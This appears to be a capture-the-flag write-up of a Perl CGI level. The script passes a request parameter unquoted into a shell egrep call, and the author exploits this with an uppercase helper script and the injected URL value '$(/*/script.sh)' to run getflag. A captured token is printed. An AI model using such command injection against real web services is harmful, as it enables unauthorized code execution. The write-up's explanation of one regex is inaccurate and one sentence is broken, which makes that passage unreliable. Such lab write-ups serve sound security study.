In this level, we have a `setuid` perl script : 
```
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

As in level04, we go and check the following URL : `http://192.168.43.70:4646/`
It only prints `..`.

The function `t` takes 2 arguments, `nn` and `xx` and applies 2 regex to `xx` :
one that turns every character to uppercase, the other that removes every
whitespace and the character that comes right after.   

Then, it assigns to `output` the return of `egrep` function (same as `grep`,
except it takes a regex as parameter) for every match with `xx` it finds in a 
`/tmp/xd` file.

Next, it iterates over `output`, split each line with ":" character, and checks
if what is after ":" contains `nn` parameter. If yes, it returns , else 0.

Overall, what we need to do is not to follow what the script does, but to take
advantage of the `egrep` function by passing our `getflag` to it, so it executes
it no matter what `egrep` returns. But it is tricky, because `xx` argument is
being uppercase and all whitespaces removed.

We create an uppercase script. `cat /tmp/SCRIPT.SH` :

> getflag > /tmp/flag

Instead of putting `sh script.sh` we put `/*/script.sh` so it can look in every
directory for a SCRIPT.SH to executes : 

`http://192.168.43.70:4646/?x=$(/*/script.sh)`

`cat /tmp/flag` :
> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

# Sources : 

Perl's sigils explained : 
- https://stackoverflow.com/questions/2731542/what-is-the-difference-between-this-that-and-those-in-perl

About `source` command : 
- https://www.baeldung.com/linux/source-command

Perl Basics : 
- https://perldoc.perl.org/perlintro#Safety-net

`tr` function : 
- http://softpanorama.org/Scripting/Perlorama/Functions/String_operations_in_perl/tr.shtml
